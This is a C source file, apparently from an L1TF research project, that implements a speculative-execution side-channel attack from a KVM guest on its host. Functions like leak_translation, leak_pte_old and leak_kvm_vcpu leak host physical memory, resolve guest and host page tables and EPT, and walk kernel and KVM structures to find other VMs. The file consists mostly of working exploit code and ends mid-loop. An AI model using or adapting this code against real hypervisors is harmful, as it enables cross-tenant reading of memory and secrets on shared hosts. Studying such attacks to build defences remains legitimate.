#include <assert.h>
#include <ctype.h>
#include <err.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>
#include "constants.h"
#include "helpers.h"
#include "hypercall.h"
#include "l1tf.h"
#include "spectre.h"
#include "util.h"
#include "timing.h"
#include "reverse.h"
#include "benchmark.h"
#include "statistics.h"
#include "leak.h"
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>


uintptr_t get_feeling_translate(uintptr_t l0_pa, uintptr_t va)
{
	const int verbose = 1;
	if (verbose >= 2) fprintf(stderr, "get_feeling_translate(l0_pa = %lx, va = %lx)\n", l0_pa, va);
	if (verbose >= 2) dumpp(l0_pa);
	uintptr_t pgd_pa = l0_pa + 8 * BITS(va, 48, 39);
	if (verbose >= 2) dumpp(pgd_pa);
	uintptr_t pgd = hc_read_pa(pgd_pa);
	if (verbose >= 1) dumpp(pgd);

	uintptr_t l1 = pgd & PFN_MASK;
	if (verbose >= 2) dumpp(l1);
	uintptr_t pud_pa = l1 + 8 * BITS(va, 39, 30);
	if (verbose >= 2) dumpp(pud_pa);
	uintptr_t pud = hc_read_pa(pud_pa);
	if (verbose >= 1) dumpp(pud);
	if (IS_HUGE(pud)) {
		uintptr_t pa = (pud & BITS_MASK(52, 30)) | BITS(va, 30, 0);
		if (verbose >= 2) dumpp(pa);
		if (verbose >= 2) fprintf(stderr, "true pa from hc_translate: %lx\n\n", hc_translate(va));
		return pa;
	}

	uintptr_t l2 = pud & PFN_MASK;
	if (verbose >= 2) dumpp(l2);
	uintptr_t pmd_pa = l2 + 8 * BITS(va, 30, 21);
	if (verbose >= 2) dumpp(pmd_pa);
	uintptr_t pmd = hc_read_pa(pmd_pa);
	if (verbose >= 1) dumpp(pmd);
	if (IS_HUGE(pmd)) {
		uintptr_t pa = (pmd & BITS_MASK(52, 21)) | BITS(va, 21, 0);
		if (verbose >= 2) dumpp(pa);
		if (verbose >= 2) fprintf(stderr, "true pa from hc_translate: %lx\n\n", hc_translate(va));
		return pa;
	}

	uintptr_t l3 = pmd & PFN_MASK;
	if (verbose >= 2) dumpp(l3);
	uintptr_t pte_pa = l3 + 8 * BITS(va, 21, 12);
	if (verbose >= 2) dumpp(pte_pa);
	uintptr_t pte = hc_read_pa(pte_pa);
	if (verbose >= 1) dumpp(pte);
	uintptr_t pa = (pte & PFN_MASK) | BITS(va, 12, 0);
	if (verbose >= 1) dumpp(pa);
	if (verbose >= 2) fprintf(stderr, "true pa from hc_translate: %lx\n\n", hc_translate(va));
	return pa;
}

hpa_t get_feeling_translate_gva(gva_t va, hpa_t gcr3, hpa_t eptp)
{
	const int verbose = 1;
	if (verbose >= 2) fprintf(stderr, "get_feeling_translate_gva(eptp = %lx, gcr3 = %lx, va = %lx)\n", eptp, gcr3, va);
	uintptr_t pgd_pa = gcr3 + 8 * BITS(va, 48, 39);
	if (verbose >= 2) dump(pgd_pa);
	uintptr_t gpgd = hc_read_pa(pgd_pa);
	if (verbose >= 2) dump(gpgd);
	uintptr_t pgd = get_feeling_translate(eptp, gpgd);
	pgd = (pgd & PFN_MASK) | (gpgd & ~PFN_MASK);
	if (verbose >= 1) dump(pgd);

	uintptr_t l1 = pgd & PFN_MASK;
	if (verbose >= 2) dump(l1);
	uintptr_t pud_pa = l1 + 8 * BITS(va, 39, 30);
	if (verbose >= 2) dump(pud_pa);
	uintptr_t gpud = hc_read_pa(pud_pa);
	if (verbose >= 2) dump(gpud);
	if (IS_HUGE(gpud)) {
		gpa_t gpa = (gpud & BITS_MASK(52, 30)) | BITS(va, 30, 0);
		if (verbose >= 2) dump(gpa);
		hpa_t hpa = get_feeling_translate(eptp, gpa);
		if (verbose >= 1) dump(hpa);
		return hpa;
	}
	uintptr_t pud = get_feeling_translate(eptp, gpud);
	if (verbose >= 1) dump(pud);

	uintptr_t l2 = pud & PFN_MASK;
	if (verbose >= 2) dump(l2);
	uintptr_t pmd_pa = l2 + 8 * BITS(va, 30, 21);
	if (verbose >= 2) dump(pmd_pa);
	uintptr_t gpmd = hc_read_pa(pmd_pa);
	if (verbose >= 2) dump(gpmd);
	if (IS_HUGE(gpmd)) {
		gpa_t gpa = (gpmd & BITS_MASK(52, 21)) | BITS(va, 21, 0);
		if (verbose >= 2) dump(gpa);
		hpa_t hpa = get_feeling_translate(eptp, gpa);
		if (verbose >= 1) dump(hpa);
		return hpa;
	}
	uintptr_t pmd = get_feeling_translate(eptp, gpmd);
	if (verbose >= 1) dump(pmd);

	uintptr_t l3 = pmd & PFN_MASK;
	if (verbose >= 2) dump(l3);
	uintptr_t pte_pa = l3 + 8 * BITS(va, 21, 12);
	if (verbose >= 2) dump(pte_pa);
	uintptr_t gpte = hc_read_pa(pte_pa);
	if (verbose >= 2) dump(gpte);
	gpa_t gpa = (gpte & PFN_MASK) | BITS(va, 12, 0);
	if (verbose >= 1) dump(gpa);
	hpa_t hpa = get_feeling_translate(eptp, gpa);
	if (verbose >= 1) dump(hpa);
	return hpa;
}

hpa_t leak_translation(hpa_t base, va_t va, hpa_t cr3, hpa_t eptp);

pte_t leak_pte_old(hpa_t base, hpa_t pa, hpa_t eptp)
{
	pte_t pte;
	do {
		for (int i = 0; i < 7; i++)
			l1tf_leak((char *)&pte, base, pa, sizeof(u64));
		fprintf(stderr, "leak_pte_old: %lx\n", pte);
	// } while (!((pte & 0x7ff8000000000ffbULL) == 0x63)); // normal
	} while (!((pte & 0x3ULL) == 0x3)); // ept

	if (eptp) {
		// `pte` is a guest PTE.
		u64 flags = pte & ~PFN_MASK;
		gpa_t ptep = pte & PFN_MASK;
		hpa_t pfn = leak_translation(base, ptep, eptp, 0);
		pte = pfn | flags;
	}

	return pte;
}

/* Translate virtual address `va` relative to the page tables at `cr3`.
 *
 * If `eptp == 0`, then `va` is interpreted as *host* virtual address.
 * If `eptp != 0`, then `va` is a *guest* virtual address, and a two dimensional
 * page table walk is done with respect to the extended page tables at `eptp`.
 *
 * In all cases, we return `va`'s *host* physical address.
 */
hpa_t leak_translation(hpa_t base, va_t va, hpa_t cr3, hpa_t eptp)
{
	fprintf(stderr, "leak_translation(base=%lx, va=%lx, cr3=%lx, eptp=%lx)\n", base, va, cr3, eptp);
	assert(base < HOST_MEMORY_SIZE);
	assert(cr3 < HOST_MEMORY_SIZE && (cr3 & 0xfff) == 0);
	assert(eptp < HOST_MEMORY_SIZE && (eptp & 0xfff) == 0);
	hpa_t page_table = cr3;

	// Level 0 -- Page Global Directory.
	hpa_t pgdp = page_table + 8 * BITS(va, 48, 39);
	dump(pgdp);
	pte_t pgd = leak_pte_old(base, pgdp, eptp);
	dump(pgd);
	page_table = pgd & PFN_MASK;

	// Level 1 -- Page Upper Directory.
	hpa_t pudp = page_table + 8 * BITS(va, 39, 30);
	dump(pudp);
	pte_t pud = leak_pte_old(base, pudp, eptp);
	dump(pud);
	if (IS_HUGE(pud)) {
		hpa_t pa = (pud & BITS_MASK(52, 30)) | BITS(va, 30, 0);
		dump(pa);
		return pa;
	}
	page_table = pud & PFN_MASK;

	// Level 2 -- Page Middle Directory.
	hpa_t pmdp = page_table + 8 * BITS(va, 30, 21);
	dump(pmdp);
	pte_t pmd = leak_pte_old(base, pmdp, eptp);
	dump(pmd);
	if (IS_HUGE(pmd)) {
		hpa_t pa = (pmd & BITS_MASK(52, 21)) | BITS(va, 21, 0);
		dump(pa);
		return pa;
	}
	page_table = pmd & PFN_MASK;

	// Level 3 -- Page Table Entry.
	hpa_t ptep = page_table + 8 * BITS(va, 21, 12);
	dump(ptep);
	pte_t pte = leak_pte_old(base, ptep, eptp);
	dump(pte);
	hpa_t pa = (pte & PFN_MASK) | BITS(va, 12, 0);
	dump(pa);
	return pa;
}

u64 leak_u64(hpa_t base, hpa_t pa, int iters)
{
	u64 data;
	for (int i = 0; i < iters; i++)
		l1tf_leak((char *)&data, base, pa, sizeof(u64));
	return data;
}

hva_t leak_kvm_vcpu(hpa_t base, hva_t direct_map, hva_t kvm)
{
	#define ITERS 7
	fprintf(stderr, "leak_kvm_vcpu(base=%lx, direct_map=%lx, kvm=%lx)\n", base, direct_map, kvm);
	hva_t vcpu = -1, kvm_leak = -1;
	do {
		hpa_t kvm_ = kvm - direct_map;
		hva_t head = leak_u64(base, kvm_ + H_KVM_VCPU_ARRAY + 8, ITERS);
		hpa_t head_ = head - direct_map;
		u64 entry = leak_u64(base, head_, ITERS);
		hva_t ptr = (entry << 16) | (entry >> 48); // Crazy xarray stuff.
		hva_t ptr_ = ptr - direct_map;
		vcpu = leak_u64(base, ptr_ + 0x10, ITERS);
		dump(vcpu);
		hpa_t vcpu_ = vcpu - direct_map;
		kvm_leak = leak_u64(base, vcpu_, ITERS);
		dump(kvm_leak);
	} while (kvm_leak != kvm);

	return vcpu;
}

void translator_exam(hpa_t base, hva_t direct_map, hpa_t eptp, hpa_t hcr3, hpa_t gcr3, gva_t text)
{
	gpa_t guest_cr3 = 0x189e3e001;
	leak_translation(base, guest_cr3, eptp, 0);
	fprintf(stderr, "correct gcr3's hpa = %lx\n", gcr3);

	leak_translation(base, direct_map+0x12345678UL, hcr3, 0);
	fprintf(stderr, "correct pa = %lx\n", 0x12345678UL);

	gva_t guest_direct_map = 0xffff94eb40000000;
	gva_t the_va = guest_direct_map+0x12345678UL;
	fprintf(stderr, "gva_t %lx  ]-->  data %lx\n", the_va, procfs_get_data(the_va));
	leak_translation(base, the_va, gcr3, eptp);

	fprintf(stderr, "@ %lx  --> data %lx\n", 0x12345678UL, leak_u64(base, 0x12345678, 5));

	hpa_t pa = leak_translation(base, 0x12345678, eptp, 0);
	fprintf(stderr, "@ %lx  --> data %lx\n", pa, leak_u64(base, pa, 5));
}

void translator_exam_feeling(hpa_t base, hva_t hdm, hpa_t eptp, hpa_t hcr3, hpa_t gcr3, gva_t text)
{
	dump(get_feeling_translate(hcr3, hdm + (3UL << 32) + 0x123456));
	fprintf(stderr, "\n");

	gva_t dm_gva = procfs_direct_map() + 0x12345;
	dump(dm_gva); fprintf(stderr, "\n");
	hpa_t dm_hpa = get_feeling_translate_gva(dm_gva, gcr3, eptp);
	dump(dm_hpa);
	dump(hc_read_pa(dm_hpa));
	dump(procfs_get_data(dm_gva));
	fprintf(stderr, "\n");

	dump(text);
	hpa_t text_hpa = get_feeling_translate_gva(text, gcr3, eptp);
	dump(text_hpa);
	dump(procfs_get_data(text));
	dump(hc_read_pa(text_hpa));

	dump(gcr3);
	// print_page_table(base, gcr3);
	gcr3 = get_feeling_translate_gva((gva_t)(procfs_pgd()), gcr3, eptp);
	dump(gcr3);
	// print_page_table(base, gcr3);
	fprintf(stderr, "\n");

	void *p = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_POPULATE, -1, 0);
	assert(p != MAP_FAILED);
	memset(p, 0x97, 0x1000);
	gva_t p_gva = (uintptr_t)p;
	dump(procfs_get_physaddr(p_gva));
	dump(p_gva);
	hpa_t p_hpa = get_feeling_translate_gva(p_gva, gcr3, eptp);
	dump(p_hpa);
	dump(hc_read_pa(p_hpa));
	fprintf(stderr, "\n");
}

void get_feeling_dump_task(hva_t task)
{
	u64 pids = hc_read_va(task+H_TASK_PID);
	char comm[16];
	*(u64 *)&comm[0] = hc_read_va(task+H_TASK_COMM);
	*(u64 *)&comm[8] = hc_read_va(task+H_TASK_COMM+8);
	fprintf(stderr, "task %16lx: pid = %7d, tgid = %7d, comm = \"%s\"\n", task, (int)pids, (int)(pids >> 32), comm);

	// for (int off = -0x40; off < 0x40; off += 8)
	// 	dump(hc_read_va(task+H_TASK_COMM+off));
}

void get_feeling_for_kernel_kvm_data_structures(void)
{
	uintptr_t direct_map = hc_direct_map();
	dump(direct_map);
	uintptr_t base = hc_phys_map_base();
	dump(base);
	uintptr_t base_pa = base - direct_map;
	dump(base_pa);
	fprintf(stderr, "\n");

	uintptr_t kvm_apic_map = base - 0x218;
	dump(kvm_apic_map);
	for (int off = 0; off < 0x18; off += 8) {
		fprintf(stderr, "kvm_apic_map+%3x = %16lx\n", off, hc_read_va(kvm_apic_map+off));
	}
	fprintf(stderr, "kvm_apic_map/xapic_cluster_map =  0\n");
	for (int off = 0x218; off < 0x230; off += 8) {
		fprintf(stderr, "kvm_apic_map+%3x = %16lx\n", off, hc_read_va(kvm_apic_map+off));
	}
	fprintf(stderr, "\n");

	uintptr_t kvm_lapic[2];
	for (int i = 0; i < 2; i++) {
		kvm_lapic[i] = hc_read_va(base + i*8); // kvm_apic_map's phys_map[i]
		dump(kvm_lapic[i]);
		for (int off = 0; off < 0x100; off += 8) {
			fprintf(stderr, "kvm_lapic[%d]+%3x = %16lx\n", i, off, hc_read_va(kvm_lapic[i] + off));
		}
		fprintf(stderr, "\n");
	}

	uintptr_t kvm_vcpu = hc_read_va(kvm_lapic[0]+0x90); // kvm_lapic's vcpu
	dump(kvm_vcpu);
	for (int off = 0; off < 0xc0; off += 8) {
		fprintf(stderr, "kvm_vcpu+%3x = %16lx\n", off, hc_read_va(kvm_vcpu+off));
	}
	fprintf(stderr, "\n");

	uintptr_t pid = hc_read_va(kvm_vcpu+0x78); // kvm_vcpu's pid
	dump(pid);
	for (int off = 0; off < 0x40; off += 8) {
		fprintf(stderr, "pid+%3x = %16lx\n", off, hc_read_va(pid+off));
	}
	fprintf(stderr, "\n");

	uintptr_t task_struct = hc_read_va(pid+0x20) - H_TASK_PID_LINKS; // pid's tasks[0], pointing to task_struct's pid_links[0]
	hva_t own_task_struct = task_struct;
	dump(task_struct);
	for (int off = 0; off < 0x80; off += 8) {
		fprintf(stderr, "task_struct+%3x = %16lx\n", off, hc_read_va(task_struct+off));
	}
	fprintf(stderr, "...\n");
	for (int off = 0x8c0; off < 0xc40; off += 8) {
		fprintf(stderr, "task_struct+%3x = %16lx\n", off, hc_read_va(task_struct+off));
	}
	fprintf(stderr, "\n"); 

	// Don't start with our own thread, as it may not be the thread group's
	// leader, and hence not be itself linked into the task-list.
	task_struct = hc_read_va(task_struct + 0x908) - 0x900; // task_struct's tasks.prev

	// int nr_processes = 0;
	// uintptr_t start = task_struct;
	// do {
	// 	int pidd = (int)hc_read_va(task_struct + H_TASK_PID); // task_struct's pid
	// 	int tgid = (int)hc_read_va(task_struct + H_TASK_PID+4); // task_struct's tgid
	// 	char comm[16];
	// 	*(uint64_t *)comm = hc_read_va(task_struct + H_TASK_COMM);
	// 	*(uint64_t *)&comm[8] = hc_read_va(task_struct + H_TASK_COMM + 8);
	// 	if (0) fprintf(stderr, "task_struct: %16lx tgid: %3d, pid: %3d comm: %s\n", task_struct, tgid, pidd, comm);

	// 	nr_processes++;
	// 	task_struct = hc_read_va(task_struct + H_TASK_TASKS) - H_TASK_TASKS; // task_struct's tasks.next
	// } while (task_struct != start);
	// fprintf(stderr, "nr_processes: %d\n\n", nr_processes);

	#define KVM_MID 0x1128
	#define KVM_RAD 0x10
	uintptr_t kvm = hc_read_va(kvm_vcpu);
	dump(kvm);
	for (int off = 0x1000; off < 0x1300; off += 8) {
		u64 data = hc_read_va(kvm+off);
		fprintf(stderr, "kvm+%4x = %16lx  -->  %16lx %16lx %16lx\n", off, data, hc_read_va(data), hc_read_va(data+8), hc_read_va(data+16));
	}
	fprintf(stderr, "\n");

	dump(kvm);
	dump(kvm_vcpu);
	dump(hc_translate(kvm));
	for (int off = KVM_MID-KVM_RAD; off < KVM_MID+KVM_RAD; off += 8) {
		u64 data = hc_read_va(kvm+off);
		fprintf(stderr, "kvm+%3x = %16lx  -->  %16lx %16lx %16lx\n", off, data, hc_read_va(data), hc_read_va(data+8), hc_read_va(data+16));
	}
	fprintf(stderr, "...\n");
	// for (int off = 0x9b70-0x40; off < 0x9b70+0x40; off += 8) {
	// 	fprintf(stderr, "kvm+%3x = %16lx\n", off, hc_read_va(kvm+off));
	// }
	// fprintf(stderr, "\n");

	uintptr_t kvm_next = hc_read_va(kvm + 0x1178) - 0x1178;
	dump(kvm_next);
	dump(kvm_vcpu);
	for (int off = KVM_MID-KVM_RAD; off < KVM_MID+KVM_RAD; off += 8) {
		u64 data = hc_read_va(kvm_next+off);
		fprintf(stderr, "kvm_next+%3x = %16lx  -->  %16lx %16lx %16lx\n", off, data, hc_read_va(data), hc_read_va(data+8), hc_read_va(data+16));
	}
	fprintf(stderr, "\n");

	uintptr_t kvm_prev = hc_read_va(kvm + 0x1178+8) - 0x1178;
	dump(kvm_prev);
	dump(kvm_vcpu);
	for (int off = KVM_MID-KVM_RAD; off < KVM_MID+KVM_RAD; off += 8) {
		u64 data = hc_read_va(kvm_prev+off);
		fprintf(stderr, "kvm_prev+%3x = %16lx  -->  %16lx %16lx %16lx\n", off, data, hc_read_va(data), hc_read_va(data+8), hc_read_va(data+16));
	}
	fprintf(stderr, "\n");

	uintptr_t head = 0xffffa03527ecd6d2;
	dump(head);
	for (int off = 0; off < 0x40; off += 8) {
		u64 data = hc_read_va(head+off);
		u64 ptr = (data << 16) | (data >> 48);
		fprintf(stderr, "head+%3x = %16lx | %16lx  -->  %16lx %16lx %16lx %16lx %16lx %16lx\n", off, data, ptr,
			hc_read_va(ptr), hc_read_va(ptr+8), hc_read_va(ptr+16), hc_read_va(ptr+24), hc_read_va(ptr+32), hc_read_va(ptr+40));
	}
	fprintf(stderr, "\n");

	head = 0xffffa03527eceda2;
	dump(head);
	for (int off = 0; off < 0x40; off += 8) {
		u64 data = hc_read_va(head+off);
		u64 ptr = (data << 16) | (data >> 48);
		fprintf(stderr, "head+%3x = %16lx | %16lx  -->  %16lx %16lx %16lx %16lx %16lx %16lx\n", off, data, ptr,
			hc_read_va(ptr), hc_read_va(ptr+8), hc_read_va(ptr+16), hc_read_va(ptr+24), hc_read_va(ptr+32), hc_read_va(ptr+40));
	}
	fprintf(stderr, "\n");

	uintptr_t vva;
	vva = 0xffffa037d0a98000; fprintf(stderr, "@ %16lx --> %16lx\n", vva, hc_read_va(vva));
	vva = 0xffffa037d0a9a300; fprintf(stderr, "@ %16lx --> %16lx\n", vva, hc_read_va(vva));
	vva = 0xffffa03509ee8000; fprintf(stderr, "@ %16lx --> %16lx\n", vva, hc_read_va(vva));
	vva = 0xffffa037d0a9c600; fprintf(stderr, "@ %16lx --> %16lx\n", vva, hc_read_va(vva));


	exit(1);

	uintptr_t mm_struct = hc_read_va(task_struct+0x950);
	dump(mm_struct);
	for (int off = 0; off < 0xc0; off += 8) {
		fprintf(stderr, "mm_struct+%3x = %16lx\n", off, hc_read_va(mm_struct+off));
	}
	fprintf(stderr, "\n");

	uintptr_t pgd = hc_read_va(mm_struct+0x78);
	dump(pgd);
	for (int off = 0xfc0; off < 0x1000; off += 8) {
		fprintf(stderr, "pgd+%3x = %16lx\n", off, hc_read_va(pgd+off));
	}
	fprintf(stderr, "\n");

	hpa_t hcr3 = pgd - direct_map;
	get_feeling_translate(hcr3, 0xffffffffc1119c78);
	get_feeling_translate(hcr3, direct_map+0x1234 + (10UL << 30));

	uintptr_t kvm_arch = kvm + 0x12a0;
	dump(kvm_arch);
	for (int off = 0x1178-0x20; off < 0x1178+0x20; off += 8) {
		fprintf(stderr, "kvm_arch+%3x = %16lx\n", off, hc_read_va(kvm_arch+off));
	}
	fprintf(stderr, "\n");
	uintptr_t after_kvm_vcpu = kvm_vcpu + 0x19d8;
	dump(after_kvm_vcpu);
	for (int off = 0; off < 0x100; off += 8) {
		fprintf(stderr, "after_kvm_vcpu+%3x = %16lx\n", off, hc_read_va(after_kvm_vcpu+off));
	}
	fprintf(stderr, "\n");

	uintptr_t vmcs01 = kvm_vcpu + 0x1a28;
	dump(vmcs01);
	uintptr_t loaded_vmcs = kvm_vcpu + 0x1ac8;
	dump(loaded_vmcs);
	dump(hc_read_va(loaded_vmcs));
	fprintf(stderr, "\n");

	uintptr_t vmcs = hc_read_va(vmcs01);
	dump(vmcs);
	for (int off = 0; off < 0x100; off += 8) {
		fprintf(stderr, "vmcs+%3x = %16lx\n", off, hc_read_va(vmcs+off));
	}
	fprintf(stderr, "\n");


	// Finding EPTP:
	// 	u64 root_hpa = vcpu->arch.mmu->root.hpa;

	uintptr_t kvm_vcpu_arch = kvm_vcpu + 0x120;
	uintptr_t mmu = kvm_vcpu_arch + 0x168;
	dump(mmu);
	for (int off = -0x40; off < 0x40; off += 8) {
		fprintf(stderr, "mmu+%3x = %16lx\n", off, hc_read_va(mmu+off));
	}
	fprintf(stderr, "\n");

	uintptr_t kvm_mmu = hc_read_va(mmu);
	dump(kvm_mmu);
	for (int off = 0; off < 0x80; off += 8) {
		fprintf(stderr, "kvm_mmu+%3x = %16lx\n", off, hc_read_va(kvm_mmu+off));
	}
	fprintf(stderr, "\n");

	uintptr_t hpa = hc_read_va(kvm_mmu + 0x38);
	dump(hpa);
	fprintf(stderr, "hpa is the EPTP without the flags, i.e. the phsyical address of EPT PML4\n");
	fprintf(stderr, "\n");
	hpa_t eptp = hpa;

	uintptr_t ept_l0 = hc_read_pa(eptp);
	dump(ept_l0);
	ept_l0 &= PFN_MASK;
	dump(ept_l0);
	for (int off = 0; off < 0x60; off += 8) {
		fprintf(stderr, "ept_l0+%3x = %16lx\n", off, hc_read_pa(ept_l0+off));
	}
	fprintf(stderr, "\n");

	uintptr_t ept_l1 = hc_read_pa(ept_l0+5*8);
	dump(ept_l1);
	ept_l1 &= PFN_MASK;
	dump(ept_l1);
	for (int off = 0; off < 0x60; off += 8) {
		fprintf(stderr, "ept_l1+%3x = %16lx\n", off, hc_read_pa(ept_l1+off));
	}
	fprintf(stderr, "\n");

	uintptr_t ept_l2 = hc_read_pa(ept_l1+9*8);
	dump(ept_l2);
	ept_l2 &= PFN_MASK;
	dump(ept_l2);
	for (int off = 0x7f0; off < 0x830; off += 8) {
		fprintf(stderr, "ept_l2+%3x = %16lx\n", off, hc_read_pa(ept_l2+off));
	}
	fprintf(stderr, "\n");

	uintptr_t ept_l3 = hc_read_pa(ept_l2+0x800);
	dump(ept_l3);
	ept_l3 &= PFN_MASK;
	dump(ept_l3);
	for (int off = 0; off < 0x40; off += 8) {
		fprintf(stderr, "ept_l3+%3x = %16lx\n", off, hc_read_pa(ept_l3+off));
	}
	fprintf(stderr, "\n");

	uintptr_t va = (0x5ULL << 30) | (0x9ULL << 21);
	get_feeling_translate(eptp, va);

	void *p = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_POPULATE, -1, 0);
	assert(p != MAP_FAILED);
	memset(p, 0x97, 0x1000);
	uintptr_t p_va = (uintptr_t)p;
	uintptr_t p_pa = procfs_get_physaddr(p_va);
	uintptr_t p_hpa = get_feeling_translate(eptp, p_pa);
	dump(p_va);
	dump(p_pa);
	dump(p_hpa);
	dump(hc_read_pa(p_hpa));
	memset(p, 0x79, 0x1000);
	dump(hc_read_pa(p_hpa));
	fprintf(stderr, "\n");

	dump(kvm_vcpu_arch);
	for (int off = 0x80; off < 0xd0; off += 8) {
		fprintf(stderr, "kvm_vcpu_arch+%3x = %16lx\n", off, hc_read_va(kvm_vcpu_arch+off));
	}
	fprintf(stderr, "\n");

	uintptr_t gcr3 = hc_read_va(kvm_vcpu_arch+0xa0);
	dump(gcr3);
	gcr3 &= PFN_MASK;
	dump(gcr3);
	uintptr_t gcr3_hpa = get_feeling_translate(eptp, gcr3);
	dump(gcr3_hpa);
	for (int off = 0xfe0; off < 0x1000; off += 8) {
		fprintf(stderr, "gcr3_hpa+%3x = %16lx\n", off, hc_read_pa(gcr3_hpa+off));
	}
	fprintf(stderr, "\n");

	gva_t text = 0xffffffffa4c00000;

	fprintf(stderr, "\n========================\n\n");

	translator_exam_feeling(base, direct_map, eptp, hcr3, gcr3_hpa, text);

	fprintf(stderr, "\n========================\n\n");


	gva_t swapper = text + G_TEXT_INIT_TASK;
	dump(swapper);

	gva_t swapper_tasks_next = swapper + G_TASK_TASKS;
	hpa_t swapper_tasks_next_hpa = get_feeling_translate_gva(swapper_tasks_next, gcr3_hpa, eptp);

	dump(swapper_tasks_next_hpa);
	for (int off = -0x80; off < 0x80; off += 8)
		fprintf(stderr, "swapper_tasks_next_hpa + %4x: %16lx\n", off, hc_read_pa(swapper_tasks_next_hpa+off));

	gva_t init = hc_read_pa(swapper_tasks_next_hpa) - G_TASK_TASKS;

	gva_t init_comm = init + G_TASK_COMM;
	hpa_t init_comm_hpa = get_feeling_translate_gva(init_comm, gcr3_hpa, eptp);
	char initcomm[16];
	*(u64 *)initcomm = hc_read_pa(init_comm_hpa);
	*(u64 *)(initcomm+8) = hc_read_pa(init_comm_hpa+8);
	display(initcomm, sizeof(initcomm));

	gva_t init_pids = init + G_TASK_PID;
	hpa_t init_pids_hpa = get_feeling_translate_gva(init_pids, gcr3_hpa, eptp);
	fprintf(stderr, "PIDs: %lx\n", hc_read_pa(init_pids_hpa));

	hpa_t search = get_feeling_translate_gva(init+0x880, gcr3_hpa, eptp);
	dump(search);
	for (int off = 0; off < 0x200; off += 8)
		fprintf(stderr, "init + 0x880 + %4x: %16lx\n", off, hc_read_pa(search+off));

	gva_t init_mm = hc_read_pa(get_feeling_translate_gva(init + G_TASK_MM, gcr3_hpa, eptp));
	hpa_t init_mm_hpa = get_feeling_translate_gva(init_mm, gcr3_hpa, eptp);
	dump(init_comm_hpa);
	for (int off = 0; off < 0x200; off += 8)
		fprintf(stderr, "init_mm + %4x: %16lx\n", off, hc_read_pa(init_mm_hpa+off));

	//         init_comm_hpa =        7aba8eca8
	// init_mm + 0x100 +    0:                0
	// init_mm + 0x100 +    8:                0
	// init_mm + 0x100 +   10:             13b6
	// init_mm + 0x100 +   18:              9b8
	// init_mm + 0x100 +   20:              103
	// init_mm + 0x100 +   28:                0
	// init_mm + 0x100 +   30:             93ac
	// init_mm + 0x100 +   38:     55592c5e6000  <-- start_code
	// init_mm + 0x100 +   40:     55592c6c558d  <-- end_code
	// init_mm + 0x100 +   48:     55592c725e90  <-- start_data
	// init_mm + 0x100 +   50:     55592c77411c  <-- end_data
	// init_mm + 0x100 +   58:     5559396db000  <-- start_brk @+0x158
	// init_mm + 0x100 +   60:     5559399d4000  <-- brk
	// init_mm + 0x100 +   68:     7ffc9f74de30  <-- start_stack
	// init_mm + 0x100 +   70:     7ffc9f74ff1f  <-- arg_start
	// init_mm + 0x100 +   78:     7ffc9f74ff2a  <-- arg_end
	// init_mm + 0x100 +   80:     7ffc9f74ff2a  <-- env_start
	// init_mm + 0x100 +   88:     7ffc9f74ffed  <-- env_end
	// init_mm + 0x100 +   90:               21
	// init_mm + 0x100 +   98:     7f5ff0aa0000
	// init_mm + 0x100 +   a0:               33
	// init_mm + 0x100 +   a8:              e30
	// init_mm + 0x100 +   b0:               10
	// init_mm + 0x100 +   b8:         1f8bfbff
	// init_mm + 0x100 +   c0:                6
	// mathe@rain-vm-father:~/l1tf_reloaded$ sudo cat /proc/1/maps
	// 55592c5e6000-55592c6c6000 r-xp 00036000 08:03 1049207                    /usr/lib/systemd/systemd
	// 5559396db000-5559399d4000 rw-p 00000000 00:00 0                          [heap]
	// 7ffc9f64d000-7ffc9f750000 rw-p 00000000 00:00 0                          [stack]

	//                  init_comm_hpa =        7aba8eca8
	// init_mm +    0:                1
	// init_mm +    8:                0
	// init_mm +   10:                0
	// init_mm +   18:                0
	// init_mm +   20:                0
	// init_mm +   28:                0
	// init_mm +   30:                0
	// init_mm +   38:                0
	// init_mm +   40:      30f00000000
	// init_mm +   48: ffff970cce3ce61e
	// init_mm +   50:     7f5ff0ade000
	// init_mm +   58:     2b46b96cd000
	// init_mm +   60:         f7fd3000
	// init_mm +   68:         55580000
	// init_mm +   70:     7ffffffff000
	// init_mm +   78: ffff970cc33ee000  <-- pgd
	// init_mm +   80:        100000000
	// init_mm +   88:     2f5408000c40

	fprintf(stderr, "eptp = %lx \n gcr3_hpa = %lx\n", eptp, gcr3_hpa);

	fprintf(stderr, "===================================================================\n");
	fprintf(stderr, "===================================================================\n");
	fprintf(stderr, "===================================================================\n");

	fprintf(stderr, ">>> Own kvm and kvm_vcpu strucutres:\n");
	dump(kvm);
	dump(kvm_vcpu);
	fprintf(stderr, "\n>>> Chose all kvm and kvm_vcpu strucutres:\n");

	// Walk all kvm structs in the vm_list:
	hva_t cur_kvm = kvm; // own kvm
	do {
		dump(cur_kvm);

		if ((cur_kvm >> 32) == 0xffffffff) {
			fprintf(stderr, "VM_LIST global entry, skipping kvm print\n");
			cur_kvm = hc_read_va(cur_kvm + H_KVM_VM_LIST) - H_KVM_VM_LIST;
			continue;
		}

		// Get the kvm_vcpu structs:

		/*hva_t*/ head = hc_read_va(cur_kvm + H_KVM_VCPU_ARRAY + H_XARRAY_HEAD);
		// dumpp(head);
		u64 entry = hc_read_va(head + 0x18);
		// dumpp(entry);
		hva_t ptr = (entry << 16) | (entry >> 48); // Crazy xarray stuff.
		// dumpp(ptr);

		hva_t vcpu1 = hc_read_va(ptr + 0x10);
		dumpp(vcpu1);
		hva_t vcpu2 = hc_read_va(ptr + 0x18);
		dumpp(vcpu2);

		assert(hc_read_va(vcpu1) == cur_kvm);
		assert(hc_read_va(vcpu2) == cur_kvm);
		fprintf(stderr, "[OK] vcpu1 and vcpu2 indeed below to cur_kvm\n");

		cur_kvm = hc_read_va(cur_kvm + H_KVM_VM_LIST) - H_KVM_VM_LIST;
	} while (cur_kvm != kvm);


	fprintf(stderr, "===================================================================\n");
	fprintf(stderr, "===================================================================\n");
	fprintf(stderr, "===================================================================\n");

	fprintf(stderr, ">>> Find struct kvm from our own task_struct (via open files):\n");

	dump(own_task_struct);
	for (int off = 0; off < 0x100; off += 8) {
